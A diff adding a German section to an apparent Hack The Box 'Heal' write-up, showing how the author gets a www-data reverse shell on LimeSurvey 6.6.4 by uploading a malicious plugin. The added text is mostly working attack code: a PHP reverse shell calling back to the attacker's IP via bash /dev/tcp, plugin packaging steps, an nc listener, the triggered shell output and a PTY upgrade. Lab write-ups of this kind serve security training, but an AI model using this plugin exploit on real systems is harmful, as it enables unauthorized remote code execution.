@@ -339,6 +339,7 @@ Hashcat‑Output:
 nice, jetzt haben wir ralphs pwd: `147258369`
 
 7. Erfolgreicher Admin‑Login
+
 Mit
 
 ```
@@ -350,6 +351,114 @@ konnte ich mich unter http://take‑survey.heal.htb/admin einloggen und erhielt 
 
 ![alt text](Screenshot_2025-04-19_17_49_00.png)
 
+## Reverse Shell – www-data via LimeSurvey Plugin Upload
+
+Nachdem ich Zugriff auf das Admin‑Panel von LimeSurvey hatte, habe nach der version 6.6.4 gesucht und habe im internet gefunden das es ein rce exploit gibt:
+
+https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
+
+Da Standard‑Payloads die Web‑UI oft zum Absturz bringen (504 Gateway Timeout), habe ich ein nicht-blockierendes Reverse‑Shell‑Plugin erstellt, das sich problemlos installieren und triggern lässt.
+
+1. Exploit‑Plugin bauen, mit hilfe des github: https://github.com/N4s1rl1/Limesurvey-6.6.4-RCE
+
+```bash
+mkdir -p ~/heal_plugin && cd ~/heal_plugin
+```
+
+Reverse‑Shell als PHP‑Datei:
+```php
+cat > php-rev.php <<'EOF'
+<?php
+$ip = '10.10.14.199';  // ← meine tun0‑IP
+$port = 9001;          // ← Listener‑Port
+
+$cmd = "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'";
+$payload = "curl -s -X POST --data \"\$($cmd)\" http://$ip:$port &";
+system($payload);
+?>
+EOF
+```
+
+Plugin‑Metadaten (config.xml): 
+
+```xml
+cat > config.xml <<'EOF'
+<?xml version="1.0" encoding="UTF-8"?>
+<config>
+  <metadata>
+    <name>lyfe691-exploit</name>
+    <type>plugin</type>
+    <author>lyfe691</author>
+    <version>1.0</version>
+    <description>non-blocking reverse shell plugin</description>
+    <license>GPLv3</license>
+  </metadata>
+
+  <files>
+    <file>php-rev.php</file>
+  </files>
+
+  <compatibility>
+    <version>6.0</version>
+    <version>6.1</version>
+    <version>6.6</version>
+  </compatibility>
+</config>
+EOF
+```
+
+Zip-Archiv erstellen:
+
+```bash
+zip lyfe691-exploit.zip php-rev.php config.xml
+```
+
+2. Plugin hochladen und aktivieren
+
+Im Web-Interface unter http://take‑survey.heal.htb/admin:
+
+    Configuration -> Plugins
+
+    Klick auf Upload & install -> lyfe691-exploit.zip auswählen
+
+    Installieren: 
+
+![alt text](Screenshot_2025-04-19_20_22_46.png)
+
+    Und dann noch aktivieren: 
+
+![alt text](Screenshot_2025-04-19_20_23_11.png)
+
+
+
+3. Listener auf Kali öffnen
+
+`nc -lvnp 9001`
+
+4. Reverse Shell triggern
+
+Im Browser:
+
+`http://take-survey.heal.htb/upload/plugins/lyfe691-exploit/php-rev.php`
+
+-> Shell poppt in Kali auf:
+
+```bash
+connect to [10.10.14.199] from (UNKNOWN) [10.10.11.46] 52792
+www-data@heal:/var/www/limesurvey$
+```
+![alt text](Screenshot_2025-04-19_20_30_08.png)
+
+PTY-Upgrade:
+```bash
+cd /tmp
+python3 -c 'import pty,os; pty.spawn("/bin/bash")'
+CTRL + Z
+stty raw -echo; fg
+export TERM=xterm
+```
+
+Jetzt hatte ich eine voll funktionsfähige Shell als www-data auf der Maschine.
 
 
 
